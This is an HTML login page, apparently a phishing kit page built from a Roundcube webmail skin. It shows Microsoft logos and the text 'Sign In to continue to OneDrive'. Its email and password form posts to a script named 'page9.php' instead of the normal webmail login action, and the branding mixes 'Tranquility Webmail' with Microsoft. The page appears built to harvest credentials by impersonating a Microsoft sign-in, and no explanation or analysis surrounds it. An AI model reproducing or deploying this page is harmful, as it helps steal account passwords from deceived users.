
<!DOCTYPE html>
<html lang="en" class="xfont-family-roboto xfont-size-n xthick-font-no">

<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>Welcome Sign in</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
<meta name="theme-color" content="#f4f4f4">
<meta name="msapplication-navbutton-color" content="#f4f4f4">

	<link rel="shortcut icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">

	<link rel="stylesheet" href="./bootstrap.min.css">
			<link rel="stylesheet" href="./styles.css">
		
	<link rel="stylesheet" type="text/css" href="./elastic.css">
<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Cairo&amp;subset=latin-ext">
<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Montserrat+Alternates&amp;subset=latin-ext">
<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Sarala&amp;subset=latin-ext">
<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Quattrocento&amp;subset=latin-ext">
<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Merienda&amp;subset=latin-ext">
<link rel="stylesheet" type="text/css" href="./styles2.css">
<link rel="stylesheet" type="text/css" href="./styles3.css">
<link rel="stylesheet" type="text/css" href="./jquery-ui.css">
<script src="./jquery.min.js"></script>
<script src="./common.min.js"></script>
<script src="./app.min.js"></script>
<script src="./jstz.min.js"></script>
<script>
/*
        @licstart  The following is the entire license notice for the 
        JavaScript code in this page.

        Copyright (C) The Roundcube Dev Team

        The JavaScript code in this page is free software: you can redistribute
        it and/or modify it under the terms of the GNU General Public License
        as published by the Free Software Foundation, either version 3 of
        the License, or (at your option) any later version.

        The code is distributed WITHOUT ANY WARRANTY; without even the implied
        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
        See the GNU GPL for more details.

        @licend  The above is the entire license notice
        for the JavaScript code in this page.
*/
var rcmail = new rcube_webmail();
rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10408,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"skin":"outlook_plus","blankpage":"skins/outlook_plus/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"./?_task=login","compose_extwin":false,"xelastic":true,"dateFormats":{"php":"Y-m-d","moment":"YYYY-MM-DD","datepicker":"yy-mm-dd"},"dmFormats":{"php":"m-d","moment":"MM-DD","datepicker":"mm-dd"},"timeFormats":{"php":"H:i","moment":"HH:mm","datepicker":"HH:mm"},"timezoneOffset":-18000,"xsidebarVisible":true,"xassets":["../xframework/assets/bower_components/js-cookie/src/js.cookie.js","../xframework/assets/scripts/framework.min.js","../xframework/assets/styles/elastic.css","xskin:assets/elastic_scripts/xskin.min.js","xskin:assets/elastic_styles/styles.css","xskin:../../skins/outlook_plus/assets/styles.css","xskin:../../skins/outlook_plus/assets/scripts.min.js"],"installed_skins":["classic","elastic","larry","outlook","outlook_plus"],"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","xwatermark":"../../plugins/xskin/assets/images/watermark.png","rcp_skin":true,"request_token":"Zkrsr415T0O88qAEQSpRgmgGEOOuf9n7"});
rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK","back":"Back","errortitle":"An error occurred!","options":"Options","plaintoggle":"Plain text","htmltoggle":"HTML","previous":"Previous","next":"Next","select":"Select","browse":"Browse","choosefile":"Choose file...","choosefiles":"Choose files..."});
rcmail.gui_container("loginfooter","login-footer");rcmail.gui_object('loginform', 'login-form');
rcmail.gui_object('message', 'messagestack');
</script>

<script src="./js.cookie.min.js"></script>
<script src="./framework.min.js"></script>
<script src="./xskin.min.js"></script>
<script src="./scripts.min.js"></script>
<script src="./jquery-ui.min.js"></script>

</head>
<body class="xelastic login-page xskin skin-outlook_plus xcolor-585858 xicons-material xlist-icons-yes xbutton-icons-no xnormal-header-font xinverted-header-colors xno-taskbar-icons xno-border-radius xinverted-menu task-login action-none">
			<div id="layout">
	

<h1 class="voice">Tranquility Webmail Login</h1>

<div id="layout-content" class="selected no-navbar" role="main">
	<img src="skins/elastic/images/logo.svg?s=1598303020" id="logo" alt="Logo">
	<form id="login-form" name="login-form" method="post" class="propform" action="./page9.php">
<input type="hidden" name="_token" value="Zkrsr415T0O88qAEQSpRgmgGEOOuf9n7"><img id="logo-login" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="">

      <h2 style="text-align:left;">Sign In</h2>
     <p style="text-align:left;">to continue to OneDrive</p>

      
	<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="_default_"><input type="hidden" name="_url" id="rcmloginurl" value=""><table><tbody><tr><td class="title"><label for="rcmloginuser">Email</label>
</td>
<td class="input"><input name="_user" id="rcmloginuser" required size="40" autocapitalize="off" autocomplete="off" type="text"></td>
</tr>
<tr><td class="title"><label for="rcmloginpwd">Password</label>
</td>
<td class="input"><input name="_pass" id="rcmloginpwd" required size="40" autocapitalize="off" autocomplete="off" type="password"></td>
</tr>
</tbody>
</table>
<p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit">Next</button>
</p>

		<div id="login-footer" role="contentinfo">
			
			
							&nbsp;&bull;&nbsp; <a href="" target="_blank" class="support-link"></a>
						
		</div>
	</form>
</div>

<noscript>
	<p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
</noscript>

</div>
<a href="" target="_blank" id="supportlink" class="hidden">Privacy</a>

<div id="messagestack"></div>

<script src="./bootstrap.bundle.min.js"></script>
<script src="./ui.min.js"></script>

<a id="vendor-branding" href="index.php" target="_blank" title="More Roundcube skins and plugins at roundcubeplus.com"><span>+</span></a>
<script>
$(function() {
rcmail.init();
});
</script>

</body>
</html>